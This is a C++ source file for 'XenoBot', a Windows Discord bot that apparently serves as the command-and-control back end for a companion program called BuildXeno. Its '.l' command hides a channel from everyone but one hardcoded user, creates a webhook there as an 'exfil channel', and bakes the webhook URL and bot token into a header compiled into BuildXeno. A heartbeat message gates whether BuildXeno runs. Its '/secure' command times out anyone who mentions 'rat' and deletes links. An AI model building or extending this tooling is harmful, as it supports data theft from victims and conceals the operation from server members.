// XenoBot.cpp — Windows x64, C++17.
// Links: winhttp.lib
//
// Console Discord bot:
//   .l #channel     — sudo-only, creates a webhook there and prints its URL
//                     (paste into BuildXeno's WEBHOOK_URL)
//   /secure         — Manage Guild only, sweeps raids: deletes invite/link/scam
//                     messages, times out anyone saying "rat", kills invites.
//
// Gateway v10 over WinHTTP WebSocket, compress=false, intents 513
// (Guilds | Guild Messages).

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0A00
#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>

#include <algorithm>
#include <atomic>
#include <cctype>
#include <chrono>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <fstream>
#include <map>
#include <mutex>
#include <random>
#include <sstream>
#include <string>
#include <thread>
#include <vector>

#ifdef _MSC_VER
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "advapi32.lib")
#endif

static const char* CFG_PATH = "xeno.cfg";
static const char* SUDO_ID = "1416085051854164125";

// ------------------------------------------------------------------ json

struct JVal {
    enum Type { NUL, BOOL, NUM, STR, ARR, OBJ } t = NUL;
    bool b = false;
    double n = 0;
    std::string s;
    std::vector<JVal> a;
    std::vector<std::pair<std::string, JVal>> o;

    const JVal* get(const std::string& k) const {
        for (auto& p : o)
            if (p.first == k) return &p.second;
        return nullptr;
    }
    std::string str(const std::string& k, const std::string& d = "") const {
        const JVal* v = get(k);
        return (v && v->t == STR) ? v->s : d;
    }
    double num(const std::string& k, double d = 0) const {
        const JVal* v = get(k);
        return (v && v->t == NUM) ? v->n : d;
    }
};

struct JParser {
    const char* p;
    const char* end;
    bool ok = true;

    void ws() {
        while (p < end && (*p == ' ' || *p == '\t' || *p == '\r' || *p == '\n'))
            ++p;
    }

    static void utf8(std::string& out, unsigned cp) {
        if (cp < 0x80) {
            out += (char)cp;
        } else if (cp < 0x800) {
            out += (char)(0xC0 | (cp >> 6));
            out += (char)(0x80 | (cp & 0x3F));
        } else if (cp < 0x10000) {
            out += (char)(0xE0 | (cp >> 12));
            out += (char)(0x80 | ((cp >> 6) & 0x3F));
            out += (char)(0x80 | (cp & 0x3F));
        } else {
            out += (char)(0xF0 | (cp >> 18));
            out += (char)(0x80 | ((cp >> 12) & 0x3F));
            out += (char)(0x80 | ((cp >> 6) & 0x3F));
            out += (char)(0x80 | (cp & 0x3F));
        }
    }

    std::string parse_string() {
        std::string out;
        ++p;  // opening quote
        while (p < end) {
            char c = *p++;
            if (c == '"') return out;
            if (c != '\\') {
                out += c;
                continue;
            }
            if (p >= end) break;
            char e = *p++;
            switch (e) {
                case '"': out += '"'; break;
                case '\\': out += '\\'; break;
                case '/': out += '/'; break;
                case 'b': out += '\b'; break;
                case 'f': out += '\f'; break;
                case 'n': out += '\n'; break;
                case 'r': out += '\r'; break;
                case 't': out += '\t'; break;
                case 'u': {
                    if (p + 4 > end) { ok = false; return out; }
                    unsigned cp = 0;
                    for (int i = 0; i < 4; ++i) {
                        char h = *p++;
                        cp <<= 4;
                        if (h >= '0' && h <= '9') cp |= h - '0';
                        else if (h >= 'a' && h <= 'f') cp |= h - 'a' + 10;
                        else if (h >= 'A' && h <= 'F') cp |= h - 'A' + 10;
                        else { ok = false; return out; }
                    }
                    if (cp >= 0xD800 && cp <= 0xDBFF && p + 6 <= end &&
                        p[0] == '\\' && p[1] == 'u') {
                        p += 2;
                        unsigned lo = 0;
                        for (int i = 0; i < 4; ++i) {
                            char h = *p++;
                            lo <<= 4;
                            if (h >= '0' && h <= '9') lo |= h - '0';
                            else if (h >= 'a' && h <= 'f') lo |= h - 'a' + 10;
                            else if (h >= 'A' && h <= 'F') lo |= h - 'A' + 10;
                            else { ok = false; return out; }
                        }
                        cp = 0x10000 + ((cp - 0xD800) << 10) + (lo - 0xDC00);
                    }
                    utf8(out, cp);
                    break;
                }
                default: ok = false; return out;
            }
        }
        ok = false;
        return out;
    }

    JVal value(int depth = 0) {
        JVal v;
        if (depth > 64) { ok = false; return v; }
        ws();
        if (p >= end) { ok = false; return v; }
        char c = *p;
        if (c == '{') {
            v.t = JVal::OBJ;
            ++p;
            ws();
            if (p < end && *p == '}') { ++p; return v; }
            while (p < end) {
                ws();
                if (p >= end || *p != '"') { ok = false; return v; }
                std::string k = parse_string();
                if (!ok) return v;
                ws();
                if (p >= end || *p != ':') { ok = false; return v; }
                ++p;
                JVal child = value(depth + 1);
                if (!ok) return v;
                v.o.emplace_back(std::move(k), std::move(child));
                ws();
                if (p < end && *p == ',') { ++p; continue; }
                if (p < end && *p == '}') { ++p; return v; }
                ok = false;
                return v;
            }
            ok = false;
            return v;
        }
        if (c == '[') {
            v.t = JVal::ARR;
            ++p;
            ws();
            if (p < end && *p == ']') { ++p; return v; }
            while (p < end) {
                JVal child = value(depth + 1);
                if (!ok) return v;
                v.a.push_back(std::move(child));
                ws();
                if (p < end && *p == ',') { ++p; continue; }
                if (p < end && *p == ']') { ++p; return v; }
                ok = false;
                return v;
            }
            ok = false;
            return v;
        }
        if (c == '"') {
            v.t = JVal::STR;
            v.s = parse_string();
            return v;
        }
        if (c == 't' && end - p >= 4 && memcmp(p, "true", 4) == 0) {
            v.t = JVal::BOOL;
            v.b = true;
            p += 4;
            return v;
        }
        if (c == 'f' && end - p >= 5 && memcmp(p, "false", 5) == 0) {
            v.t = JVal::BOOL;
            p += 5;
            return v;
        }
        if (c == 'n' && end - p >= 4 && memcmp(p, "null", 4) == 0) {
            p += 4;
            return v;
        }
        // number
        const char* start = p;
        if (p < end && (*p == '-' || *p == '+')) ++p;
        while (p < end && ((*p >= '0' && *p <= '9') || *p == '.' || *p == 'e' ||
                           *p == 'E' || *p == '-' || *p == '+'))
            ++p;
        if (p == start) { ok = false; return v; }
        v.t = JVal::NUM;
        v.n = std::strtod(std::string(start, p).c_str(), nullptr);
        return v;
    }

    static bool parse(const std::string& text, JVal& out) {
        JParser jp{text.data(), text.data() + text.size()};
        out = jp.value();
        return jp.ok;
    }
};

// ------------------------------------------------------------------ state

struct Config {
    std::string token;
    std::string channel;  // bound exfil channel
    std::string webhook;  // created webhook URL
    std::string hb_msg;   // message id the heartbeat edits
};

static std::mutex g_cfg_mu;
static Config g_cfg;
static std::atomic<long long> g_seq{0};
static std::atomic<bool> g_ready{false};
static std::string g_bot_id;

static void load_cfg() {
    std::ifstream f(CFG_PATH);
    std::string line;
    while (std::getline(f, line)) {
        size_t eq = line.find('=');
        if (eq == std::string::npos) continue;
        std::string k = line.substr(0, eq);
        std::string v = line.substr(eq + 1);
        if (k == "token") g_cfg.token = v;
        if (k == "channel") g_cfg.channel = v;
        if (k == "webhook") g_cfg.webhook = v;
        if (k == "hb_msg") g_cfg.hb_msg = v;
    }
    if (g_cfg.token.empty()) {
        char buf[512];
        DWORD n = GetEnvironmentVariableA("XENO_TOKEN", buf, sizeof(buf));
        if (n > 0 && n < sizeof(buf)) g_cfg.token.assign(buf, n);
    }
}

static void save_cfg() {
    std::lock_guard<std::mutex> lk(g_cfg_mu);
    std::ofstream f(CFG_PATH, std::ios::trunc);
    f << "token=" << g_cfg.token << "\n"
      << "channel=" << g_cfg.channel << "\n"
      << "webhook=" << g_cfg.webhook << "\n"
      << "hb_msg=" << g_cfg.hb_msg << "\n";
}

// ------------------------------------------------------------------ http

static std::wstring wide(const std::string& s) {
    if (s.empty()) return {};
    int n = MultiByteToWideChar(CP_UTF8, 0, s.data(), (int)s.size(), nullptr, 0);
    std::wstring w(n, 0);
    MultiByteToWideChar(CP_UTF8, 0, s.data(), (int)s.size(), w.data(), n);
    return w;
}

static bool rest(const std::wstring& method, const std::wstring& path,
                 const std::string& body, std::string* out, int* status = nullptr) {
    HINTERNET s = WinHttpOpen(L"XenoBot/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!s) return false;
    WinHttpSetTimeouts(s, 8000, 8000, 15000, 20000);

    HINTERNET c = WinHttpConnect(s, L"discord.com", 443, 0);
    if (!c) { WinHttpCloseHandle(s); return false; }

    HINTERNET r = WinHttpOpenRequest(c, method.c_str(), path.c_str(), nullptr,
                                     WINHTTP_NO_REFERER,
                                     WINHTTP_DEFAULT_ACCEPT_TYPES,
                                     WINHTTP_FLAG_SECURE);
    if (!r) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); return false; }

    std::wstring hdr = L"Content-Type: application/json\r\nAuthorization: Bot " +
                       wide(g_cfg.token) + L"\r\nUser-Agent: XenoBot (https://xeno.local, 1.0)\r\n";

    BOOL ok = WinHttpSendRequest(
        r, hdr.c_str(), (DWORD)-1L, body.empty() ? nullptr : (LPVOID)body.data(),
        (DWORD)body.size(), (DWORD)body.size(), 0);
    if (ok) ok = WinHttpReceiveResponse(r, nullptr);

    DWORD code = 0, len = sizeof(code);
    if (ok)
        WinHttpQueryHeaders(r, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                            WINHTTP_HEADER_NAME_BY_INDEX, &code, &len,
                            WINHTTP_NO_HEADER_INDEX);
    if (status) *status = (int)code;

    std::string resp;
    if (ok) {
        DWORD avail = 0;
        while (WinHttpQueryDataAvailable(r, &avail) && avail > 0) {
            std::string buf(avail, 0);
            DWORD got = 0;
            if (!WinHttpReadData(r, buf.data(), avail, &got) || got == 0) break;
            resp.append(buf.data(), got);
            if (resp.size() > 8u * 1024 * 1024) break;
        }
    }

    WinHttpCloseHandle(r);
    WinHttpCloseHandle(c);
    WinHttpCloseHandle(s);
    if (out) *out = resp;
    return ok && code >= 200 && code < 300;
}

static bool api(const std::string& method, const std::string& path,
                const std::string& body, std::string* out = nullptr,
                int* status = nullptr) {
    return rest(wide(method), wide("/api/v10" + path), body, out, status);
}

// ------------------------------------------------------------------ helpers

static std::string json_str(const std::string& s) {
    std::string o = "\"";
    for (char c : s) {
        switch (c) {
            case '"': o += "\\\""; break;
            case '\\': o += "\\\\"; break;
            case '\n': o += "\\n"; break;
            case '\r': o += "\\r"; break;
            case '\t': o += "\\t"; break;
            default: o += c;
        }
    }
    return o + "\"";
}

static void send_message(const std::string& channel, const std::string& content) {
    api("POST", "/channels/" + channel + "/messages",
        "{\"content\":" + json_str(content.substr(0, 1900)) + "}");
}

static void delete_message(const std::string& channel, const std::string& id) {
    api("DELETE", "/channels/" + channel + "/messages/" + id, "");
}

static void timeout_member(const std::string& guild, const std::string& user,
                           int minutes) {
    SYSTEMTIME st;
    GetSystemTime(&st);
    FILETIME ft;
    SystemTimeToFileTime(&st, &ft);
    ULARGE_INTEGER u;
    u.LowPart = ft.dwLowDateTime;
    u.HighPart = ft.dwHighDateTime;
    u.QuadPart += (ULONGLONG)minutes * 60ull * 10'000'000ull;

    FILETIME out_ft;
    out_ft.dwLowDateTime = (DWORD)u.QuadPart;
    out_ft.dwHighDateTime = (DWORD)(u.QuadPart >> 32);

    SYSTEMTIME out_st;
    FileTimeToSystemTime(&out_ft, &out_st);
    char buf[32];
    std::snprintf(buf, sizeof(buf), "%04d-%02d-%02dT%02d:%02d:%02d.000Z",
                  out_st.wYear, out_st.wMonth, out_st.wDay, out_st.wHour,
                  out_st.wMinute, out_st.wSecond);

    api("PATCH", "/guilds/" + guild + "/members/" + user,
        std::string("{\"communication_disabled_until\":\"") + buf + "\"}");
}

static std::string lower(const std::string& s) {
    std::string o = s;
    std::transform(o.begin(), o.end(), o.begin(),
                   [](unsigned char c) { return (char)std::tolower(c); });
    return o;
}

static bool has_word(const std::string& hay, const std::string& word) {
    size_t pos = 0;
    while ((pos = hay.find(word, pos)) != std::string::npos) {
        bool left = pos == 0 || !std::isalnum((unsigned char)hay[pos - 1]);
        size_t e = pos + word.size();
        bool right = e >= hay.size() || !std::isalnum((unsigned char)hay[e]);
        if (left && right) return true;
        pos = e;
    }
    return false;
}

// ------------------------------------------------------------------ heartbeat

// BuildXeno refuses to run unless this message is fresh. Editing one message
// instead of posting new ones keeps the channel clean and dodges rate limits.
static std::atomic<bool> g_hb_started{false};
static std::mutex g_hb_mu;

static void heartbeat_tick() {
    std::lock_guard<std::mutex> tick(g_hb_mu);
    std::string channel, msg;
    {
        std::lock_guard<std::mutex> lk(g_cfg_mu);
        channel = g_cfg.channel;
        msg = g_cfg.hb_msg;
    }
    if (channel.empty()) return;

    std::string content = "xeno-alive " + std::to_string((long long)std::time(nullptr));
    std::string body = "{\"content\":" + json_str(content) + "}";

    if (!msg.empty()) {
        int status = 0;
        api("PATCH", "/channels/" + channel + "/messages/" + msg, body, nullptr,
            &status);
        if (status >= 200 && status < 300) return;
        // Message was deleted or the id is stale: fall through and post fresh.
    }

    std::string resp;
    if (!api("POST", "/channels/" + channel + "/messages", body, &resp)) return;

    JVal j;
    if (!JParser::parse(resp, j)) return;
    std::string id = j.str("id");
    if (id.empty()) return;

    {
        std::lock_guard<std::mutex> lk(g_cfg_mu);
        g_cfg.hb_msg = id;
    }
    save_cfg();
}

static void heartbeat_thread() {
    while (true) {
        heartbeat_tick();
        std::this_thread::sleep_for(std::chrono::seconds(45));
    }
}

static void ensure_heartbeat() {
    if (g_hb_started.exchange(true)) return;
    std::thread(heartbeat_thread).detach();
}

// ------------------------------------------------------------------ raid guard

struct MessageRef {
    std::string id;
    std::string author;
    std::string content;
};

static bool raid_content(const std::string& content, bool* rat) {
    std::string low = lower(content);
    *rat = has_word(low, "rat");
    if (*rat) return true;
    if (low.find("discord.gg/") != std::string::npos) return true;
    if (low.find("discord.com/invite") != std::string::npos) return true;
    if (low.find("http://") != std::string::npos) return true;
    if (low.find("https://") != std::string::npos) return true;
    if (has_word(low, "nitro")) return true;
    if (has_word(low, "free")) return true;
    if (low.find("@everyone") != std::string::npos) return true;
    if (low.find("@here") != std::string::npos) return true;
    return false;
}

static int secure_sweep(const std::string& guild) {
    int removed = 0, timed_out = 0;

    // Kill live invites first.
    std::string invites;
    if (api("GET", "/guilds/" + guild + "/invites", "", &invites)) {
        JVal j;
        if (JParser::parse(invites, j) && j.t == JVal::ARR) {
            for (auto& inv : j.a) {
                std::string code = inv.str("code");
                if (!code.empty()) api("DELETE", "/invites/" + code, "");
            }
        }
    }

    std::string chans;
    if (!api("GET", "/guilds/" + guild + "/channels", "", &chans)) return 0;

    JVal cj;
    if (!JParser::parse(chans, cj) || cj.t != JVal::ARR) return 0;

    int scanned_channels = 0;
    for (auto& ch : cj.a) {
        if (scanned_channels >= 20) break;  // bounded: 20 channels per pass
        if ((int)ch.num("type") != 0) continue;  // GUILD_TEXT only
        std::string cid = ch.str("id");
        if (cid.empty()) continue;
        ++scanned_channels;

        std::string msgs;
        if (!api("GET", "/channels/" + cid + "/messages?limit=100", "", &msgs))
            continue;

        JVal mj;
        if (!JParser::parse(msgs, mj) || mj.t != JVal::ARR) continue;

        for (auto& m : mj.a) {
            std::string content = m.str("content");
            std::string mid = m.str("id");
            const JVal* author = m.get("author");
            std::string aid = author ? author->str("id") : "";
            if (mid.empty()) continue;

            bool rat = false;
            if (!raid_content(content, &rat)) continue;

            delete_message(cid, mid);
            ++removed;
            Sleep(220);  // stay inside the 5/5s delete bucket

            if (rat && !aid.empty()) {
                timeout_member(guild, aid, 10);
                ++timed_out;
                Sleep(220);
            }
        }
    }
    return removed * 1000 + timed_out;
}

// ------------------------------------------------------------------ commands

static bool is_sudo(const std::string& id) { return id == SUDO_ID; }

// Escape a string for a wide string literal in generated C++.
static std::string cpp_escape(const std::string& s) {
    std::string o;
    o.reserve(s.size() + 8);
    for (char c : s) {
        if (c == '\\') o += "\\\\";
        else if (c == '"') o += "\\\"";
        else o += c;
    }
    return o;
}

// Bake the binding into a header BuildXeno includes at compile time.
// Written next to XenoBot.exe; BuildXeno's build.bat adds /I ..\XenoBot.
static void write_target_header(const std::string& webhook,
                                const std::string& channel,
                                const std::string& token) {
    std::ofstream f("xeno_target.h", std::ios::trunc);
    if (!f) return;
    f << "// Generated by XenoBot .l — rebuild BuildXeno after this.\n"
      << "#pragma once\n"
      << "#define XENO_WEBHOOK L\"" << cpp_escape(webhook) << "\"\n"
      << "#define XENO_TOKEN   L\"" << cpp_escape(token) << "\"\n"
      << "#define XENO_CHANNEL L\"" << cpp_escape(channel) << "\"\n";
}

// Lock a channel down to the bot + one human. Everything else loses view.
// Permission bits (Discord docs, guild channel overwrite):
//   VIEW_CHANNEL 1<<10, SEND_MESSAGES 1<<11, READ_MESSAGE_HISTORY 1<<16,
//   EMBED_LINKS 1<<14, ATTACH_FILES 1<<15, MANAGE_MESSAGES 1<<13,
//   MANAGE_WEBHOOKS 1<<29
static bool lock_channel(const std::string& guild, const std::string& channel) {
    if (guild.empty() || g_bot_id.empty()) return false;

    const long long VIEW = 1LL << 10;
    const long long SEND = 1LL << 11;
    const long long HISTORY = 1LL << 16;
    const long long EMBED = 1LL << 14;
    const long long ATTACH = 1LL << 15;
    const long long MANAGE_MSG = 1LL << 13;
    const long long MANAGE_HOOKS = 1LL << 29;

    long long deny_everyone = VIEW | SEND;
    long long allow_bot = VIEW | SEND | HISTORY | EMBED | ATTACH | MANAGE_MSG |
                          MANAGE_HOOKS;
    long long allow_sudo = VIEW | SEND | HISTORY;

    std::string body =
        "{\"permission_overwrites\":["
        "{\"id\":\"" + guild + "\",\"type\":0,\"allow\":\"0\",\"deny\":\"" +
        std::to_string(deny_everyone) + "\"},"
        "{\"id\":\"" + g_bot_id + "\",\"type\":1,\"allow\":\"" +
        std::to_string(allow_bot) + "\",\"deny\":\"0\"},"
        "{\"id\":\"" + std::string(SUDO_ID) + "\",\"type\":1,\"allow\":\"" +
        std::to_string(allow_sudo) + "\",\"deny\":\"0\"}"
        "]}";

    int status = 0;
    return api("PATCH", "/channels/" + channel, body, nullptr, &status) &&
           status >= 200 && status < 300;
}

static void handle_l(const std::string& channel, const std::string& author,
                     const std::string& guild, const std::string& raw) {
    if (!is_sudo(author)) {
        send_message(channel, "not for you.");
        return;
    }
    std::string arg = raw.substr(2);
    arg.erase(0, arg.find_first_not_of(" \t"));

    // Accept "<#id>", "id", or "https://discord.com/channels/g/id"
    std::string id;
    for (char c : arg)
        if (std::isdigit((unsigned char)c)) id += c;

    if (id.empty()) {
        send_message(channel, "usage: .l #channel");
        return;
    }

    // Lock first: deny @everyone view/send, allow only bot + sudo.
    bool locked = lock_channel(guild, id);

    // Create a webhook in the target channel so BuildXeno can post directly.
    std::string resp;
    int status = 0;
    std::string body = "{\"name\":\"Xeno\",\"avatar\":null}";
    if (!api("POST", "/channels/" + id + "/webhooks", body, &resp, &status)) {
        send_message(channel, "webhook create failed: " + std::to_string(status));
        return;
    }

    JVal j;
    std::string url;
    if (JParser::parse(resp, j)) {
        std::string wid = j.str("id");
        std::string wtoken = j.str("token");
        if (!wid.empty() && !wtoken.empty())
            url = "https://discord.com/api/webhooks/" + wid + "/" + wtoken;
    }
    if (url.empty()) {
        send_message(channel, "webhook created but URL parse failed.");
        return;
    }

    {
        std::lock_guard<std::mutex> lk(g_cfg_mu);
        g_cfg.channel = id;
        g_cfg.webhook = url;
    }
    save_cfg();
    write_target_header(url, id, g_cfg.token);

    std::string ack = locked
        ? "channel locked + bound. only you and the bot can see it."
        : "bound, but the lock failed — give the bot Manage Channels.";
    send_message(channel, ack + "\nwebhook: " + url);

    // Bind is live: start advertising liveness in the same channel.
    ensure_heartbeat();
    heartbeat_tick();
}

static void handle_secure(const std::string& interaction_id,
                          const std::string& interaction_token,
                          const JVal& d) {
    std::string guild;
    const JVal* g = d.get("guild_id");
    if (g && g->t == JVal::STR) guild = g->s;

    const JVal* member = d.get("member");
    const JVal* perms = member ? member->get("permissions") : nullptr;
    long long bits = 0;
    if (perms && perms->t == JVal::STR) bits = std::strtoll(perms->s.c_str(), nullptr, 10);

    const long long ADMIN = 0x8;
    const long long MANAGE_GUILD = 0x20;
    if (!(bits & ADMIN) && !(bits & MANAGE_GUILD)) {
        api("POST", "/interactions/" + interaction_id + "/" + interaction_token +
                       "/callback",
            "{\"type\":4,\"data\":{\"content\":\"manage server required.\","
            "\"flags\":64}}");
        return;
    }
    if (guild.empty()) {
        api("POST", "/interactions/" + interaction_id + "/" + interaction_token +
                       "/callback",
            "{\"type\":4,\"data\":{\"content\":\"run this inside a server.\","
            "\"flags\":64}}");
        return;
    }

    // Defer, then follow up with the result — the sweep can exceed 3 seconds.
    api("POST", "/interactions/" + interaction_id + "/" + interaction_token +
                   "/callback",
        "{\"type\":5,\"data\":{\"flags\":64}}");

    int packed = secure_sweep(guild);
    int removed = packed / 1000;
    int timed = packed % 1000;

    std::string msg = "secured. messages removed: " + std::to_string(removed) +
                      ", members timed out: " + std::to_string(timed) +
                      ", invites killed.";
    api("PATCH", "/webhooks/" + std::string("@me") + "/" +
                    interaction_token + "/messages/@original",
        "{\"content\":" + json_str(msg) + "}");
}

static void handle_message_create(const JVal& d) {
    std::string content;
    const JVal* c = d.get("content");
    if (c && c->t == JVal::STR) content = c->s;
    if (content.rfind(".l", 0) != 0) return;

    const JVal* ch = d.get("channel_id");
    const JVal* author = d.get("author");
    const JVal* guild = d.get("guild_id");
    std::string cid = (ch && ch->t == JVal::STR) ? ch->s : "";
    std::string aid = author ? author->str("id") : "";
    std::string gid = (guild && guild->t == JVal::STR) ? guild->s : "";
    if (cid.empty()) return;

    handle_l(cid, aid, gid, content);
}

static void handle_interaction(const JVal& d) {
    const JVal* data = d.get("data");
    if (!data) return;
    std::string name = data->str("name");
    if (name != "secure") return;

    const JVal* id = d.get("id");
    const JVal* token = d.get("token");
    if (!id || !token) return;

    handle_secure(id->s, token->s, d);
}

// ------------------------------------------------------------------ gateway

struct GatewayConn {
    HINTERNET ws = nullptr;
    std::string buffer;
};

static bool gateway_connect(GatewayConn& gc) {
    HINTERNET s = WinHttpOpen(L"XenoBot/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!s) return false;

    HINTERNET c = WinHttpConnect(s, L"gateway.discord.gg", 443, 0);
    if (!c) { WinHttpCloseHandle(s); return false; }

    HINTERNET r = WinHttpOpenRequest(c, L"GET", L"/?v=10&encoding=json", nullptr,
                                     WINHTTP_NO_REFERER,
                                     WINHTTP_DEFAULT_ACCEPT_TYPES,
                                     WINHTTP_FLAG_SECURE);
    if (!r) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); return false; }

    // 16 random bytes, base64 for Sec-WebSocket-Key.
    BYTE nonce[16];
    HCRYPTPROV prov = 0;
    if (!CryptAcquireContext(&prov, nullptr, nullptr, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
        memset(nonce, 0x42, sizeof(nonce));
    else {
        CryptGenRandom(prov, sizeof(nonce), nonce);
        CryptReleaseContext(prov, 0);
    }
    static const char* b64 =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string key;
    for (int i = 0; i < 16; i += 3) {
        unsigned v = nonce[i] << 16;
        if (i + 1 < 16) v |= nonce[i + 1] << 8;
        if (i + 2 < 16) v |= nonce[i + 2];
        key += b64[(v >> 18) & 63];
        key += b64[(v >> 12) & 63];
        key += (i + 1 < 16) ? b64[(v >> 6) & 63] : '=';
        key += (i + 2 < 16) ? b64[v & 63] : '=';
    }

    std::wstring hdr = L"Connection: Upgrade\r\nUpgrade: websocket\r\n"
                       L"Sec-WebSocket-Version: 13\r\nSec-WebSocket-Key: " +
                       wide(key) + L"\r\n";

    DWORD upgrade = 1;
    WinHttpSetOption(r, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET, &upgrade, sizeof(upgrade));

    BOOL ok = WinHttpSendRequest(r, hdr.c_str(), (DWORD)-1L, nullptr, 0, 0, 0);
    if (ok) ok = WinHttpReceiveResponse(r, nullptr);

    if (!ok) {
        WinHttpCloseHandle(r);
        WinHttpCloseHandle(c);
        WinHttpCloseHandle(s);
        return false;
    }

    gc.ws = WinHttpWebSocketCompleteUpgrade(r, 0);
    WinHttpCloseHandle(r);
    WinHttpCloseHandle(c);
    WinHttpCloseHandle(s);

    if (!gc.ws) return false;
    WinHttpSetTimeouts(gc.ws, 10000, 10000, 60000, 60000);
    return true;
}

static bool ws_send(HINTERNET ws, const std::string& text) {
    return WinHttpWebSocketSend(ws, WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE,
                                (PVOID)text.data(), (DWORD)text.size()) == 0;
}

static void heartbeat_loop(HINTERNET ws, int interval_ms) {
    while (true) {
        std::this_thread::sleep_for(std::chrono::milliseconds(interval_ms));
        std::string hb = "{\"op\":1,\"d\":" + std::to_string(g_seq.load()) + "}";
        if (!ws_send(ws, hb)) return;
    }
}

static void identify(HINTERNET ws) {
    std::string msg =
        "{\"op\":2,\"d\":{\"token\":" + json_str(g_cfg.token) +
        ",\"capabilities\":0,\"compress\":false,"
        "\"intents\":513,"
        "\"properties\":{\"os\":\"windows\",\"browser\":\"xeno\","
        "\"device\":\"xeno\"}}}";
    ws_send(ws, msg);
}

static bool register_commands() {
    std::string me;
    int status = 0;
    if (!api("GET", "/applications/@me", "", &me, &status)) {
        std::printf("[xeno] token check failed: HTTP %d\n", status);
        if (status == 401)
            std::printf("[xeno] 401 = bad token. Developer Portal -> Bot -> Reset Token.\n");
        return false;
    }
    JVal j;
    if (!JParser::parse(me, j)) return false;
    std::string app = j.str("id");
    if (app.empty()) return false;
    g_bot_id = app;

    std::string body =
        "{\"name\":\"secure\",\"description\":\"Purge raids: links, invites, "
        "scam spam, and RAT mentions.\",\"type\":1,\"options\":[]}";
    api("POST", "/applications/" + app + "/commands", body);
    std::printf("[xeno] /secure registered on app %s\n", app.c_str());
    return true;
}

static void run_gateway() {
    GatewayConn gc;
    while (true) {
        if (!gateway_connect(gc)) {
            std::this_thread::sleep_for(std::chrono::seconds(5));
            continue;
        }

        identify(gc.ws);
        int heartbeat_ms = 41250;  // Discord default until HELLO says otherwise
        bool heartbeat_started = false;
        std::thread hb;

        while (true) {
            BYTE buf[65536];
            DWORD got = 0;
            WINHTTP_WEB_SOCKET_BUFFER_TYPE type;
            DWORD rc = WinHttpWebSocketReceive(gc.ws, buf, sizeof(buf), &got, &type);
            if (rc != 0) break;
            if (type == WINHTTP_WEB_SOCKET_CLOSE_BUFFER_TYPE) break;

            if (type == WINHTTP_WEB_SOCKET_UTF8_FRAGMENT_BUFFER_TYPE) {
                gc.buffer.append((char*)buf, got);
                if (gc.buffer.size() > 4u * 1024 * 1024) gc.buffer.clear();
                continue;
            }
            if (type != WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE) continue;

            std::string msg = gc.buffer;
            gc.buffer.clear();
            msg.append((char*)buf, got);

            JVal j;
            if (!JParser::parse(msg, j)) continue;

            int op = (int)j.num("op");
            if (op == 10) {
                const JVal* d = j.get("d");
                double interval = d ? d->num("heartbeat_interval", 41250) : 41250;
                heartbeat_ms = (int)interval;
                if (!heartbeat_started) {
                    heartbeat_started = true;
                    hb = std::thread(heartbeat_loop, gc.ws, heartbeat_ms);
                    hb.detach();
                }
            } else if (op == 1) {
                std::string p = "{\"op\":1,\"d\":" + std::to_string(g_seq.load()) + "}";
                ws_send(gc.ws, p);
            } else if (op == 0) {
                double s = j.num("s", -1);
                if (s >= 0) g_seq.store((long long)s);

                std::string t = j.str("t");
                const JVal* d = j.get("d");
                if (!d) continue;

                if (t == "READY") {
                    g_ready = true;
                    ensure_heartbeat();
                    std::printf("[xeno] connected\n");
                } else if (t == "MESSAGE_CREATE") {
                    handle_message_create(*d);
                } else if (t == "INTERACTION_CREATE") {
                    handle_interaction(*d);
                }
            } else if (op == 7) {
                break;  // reconnect requested
            } else if (op == 9) {
                std::this_thread::sleep_for(std::chrono::seconds(5));
                break;  // invalid session
            }
        }

        WinHttpWebSocketClose(gc.ws, WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS,
                              nullptr, 0);
        WinHttpCloseHandle(gc.ws);
        gc.ws = nullptr;
        g_ready = false;
        std::this_thread::sleep_for(std::chrono::seconds(3));
    }
}

// ------------------------------------------------------------------ entry

int main() {
    SetConsoleTitleA("XenoBot");
    std::setvbuf(stdout, nullptr, _IONBF, 0);
    load_cfg();

    if (g_cfg.token.empty()) {
        std::printf("no token. set token= in xeno.cfg or XENO_TOKEN env.\n");
        return 1;
    }

    std::printf("[xeno] starting\n");
    if (!register_commands()) {
        std::printf("[xeno] not connecting: fix the token first.\n");
        return 1;
    }
    run_gateway();
    return 0;
}
